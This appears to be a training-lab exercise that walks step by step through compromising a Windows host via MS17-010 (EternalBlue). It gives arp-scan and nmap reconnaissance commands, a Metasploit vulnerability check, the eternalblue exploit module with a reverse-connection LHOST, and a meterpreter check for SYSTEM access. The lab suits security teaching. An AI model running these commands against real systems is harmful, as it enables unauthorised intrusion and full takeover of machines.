# Lab 03 — EternalBlue Exploitation
**File:** `src/laboratorios/laboratorio03.ts`
**Date:** 2026-04-02
**Difficulty:** Medium
**Category:** Network
**Network Range:** 172.16.0.0/24
**Target:** 172.16.0.11

---

## Steps

### 01 — Network Reconnaissance
**Text:** Discover hosts on the network
**Hint 1 (tool):** Use arp-scan
**Hint 2 (command):** `arp-scan 172.16.0.0/24`

### 02 — Port Scanning
**Text:** Identify the services running on the target
**Hint 1 (tool):** Use nmap
**Hint 2 (command):** `nmap -sV 172.16.0.11`

### 03 — Verify Vulnerability
**Text:** Check if the target is vulnerable to MS17-010
**Hint 1 (tool):** Use Metasploit modules
**Hint 2 (command):** `msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run`

### 04 — Exploit EternalBlue
**Text:** Exploit the MS17-010 vulnerability to gain access
**Hint 1 (tool):** Use the EternalBlue exploit
**Hint 2 (command):** `use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST 172.16.0.10 → exploit`

### 05 — Verify SYSTEM Access
**Text:** Verify that you have obtained SYSTEM privileges
**Hint 1 (tool):** Check your user id in meterpreter
**Hint 2 (command):** `getuid`
